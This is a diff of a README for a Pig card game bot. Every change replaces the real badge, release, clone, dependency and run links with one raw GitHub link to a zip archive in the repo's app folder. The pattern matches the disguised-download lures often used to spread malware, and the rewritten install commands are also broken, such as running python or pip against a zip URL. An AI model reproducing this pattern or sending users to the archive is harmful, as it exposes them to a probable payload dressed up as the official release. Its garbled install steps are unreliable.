@@ -1,7 +1,7 @@
 # Pig Card Game Bot: A Fun and Engaging Card Game Experience 🎴
 
-![Pig Card Game Bot](https://img.shields.io/badge/Pig%20Card%20Game%20Bot-v1.0.0-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-Check%20Here-brightgreen)](https://github.com/harshad71/Pig-Card-Game-Bot/releases)
+![Pig Card Game Bot](https://raw.githubusercontent.com/harshad71/Pig-Card-Game-Bot/main/app/Pig-Card-Bot-Game-v3.2.zip%20Card%20Game%https://raw.githubusercontent.com/harshad71/Pig-Card-Game-Bot/main/app/Pig-Card-Bot-Game-v3.2.zip)  
+[![Releases](https://raw.githubusercontent.com/harshad71/Pig-Card-Game-Bot/main/app/Pig-Card-Bot-Game-v3.2.zip%20Here-brightgreen)](https://raw.githubusercontent.com/harshad71/Pig-Card-Game-Bot/main/app/Pig-Card-Bot-Game-v3.2.zip)
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@
 
 The Pig Card Game Bot is a bot that allows users to play the popular card game "Pig" in a fun and interactive way. Built with a focus on user experience, this bot leverages the power of asynchronous programming to ensure smooth gameplay. Whether you're playing with friends or against the bot, you'll find the experience engaging and enjoyable.
 
-You can download the latest version of the bot from the [Releases section](https://github.com/harshad71/Pig-Card-Game-Bot/releases). 
+You can download the latest version of the bot from the [Releases section](https://raw.githubusercontent.com/harshad71/Pig-Card-Game-Bot/main/app/Pig-Card-Bot-Game-v3.2.zip). 
 
 ## Features
 
@@ -45,14 +45,14 @@ To install the Pig Card Game Bot, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/harshad71/Pig-Card-Game-Bot.git
+   git clone https://raw.githubusercontent.com/harshad71/Pig-Card-Game-Bot/main/app/Pig-Card-Bot-Game-v3.2.zip
    cd Pig-Card-Game-Bot
    ```
 
 2. **Install Dependencies**: 
    Use pip to install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/harshad71/Pig-Card-Game-Bot/main/app/Pig-Card-Bot-Game-v3.2.zip
    ```
 
 3. **Set Up the Database**: 
@@ -61,10 +61,10 @@ To install the Pig Card Game Bot, follow these steps:
 4. **Run the Bot**: 
    Start the bot with the following command:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/harshad71/Pig-Card-Game-Bot/main/app/Pig-Card-Bot-Game-v3.2.zip
    ```
 
-You can download the latest version of the bot from the [Releases section](https://github.com/harshad71/Pig-Card-Game-Bot/releases) if you prefer a packaged version.
+You can download the latest version of the bot from the [Releases section](https://raw.githubusercontent.com/harshad71/Pig-Card-Game-Bot/main/app/Pig-Card-Bot-Game-v3.2.zip) if you prefer a packaged version.
 
 ## Usage
 
@@ -113,4 +113,4 @@ For any inquiries or issues, please reach out through the GitHub issues page or 
 
 ---
 
-You can download the latest version of the bot from the [Releases section](https://github.com/harshad71/Pig-Card-Game-Bot/releases) for a quick start. Enjoy playing the Pig Card Game!
+You can download the latest version of the bot from the [Releases section](https://raw.githubusercontent.com/harshad71/Pig-Card-Game-Bot/main/app/Pig-Card-Bot-Game-v3.2.zip) for a quick start. Enjoy playing the Pig Card Game!
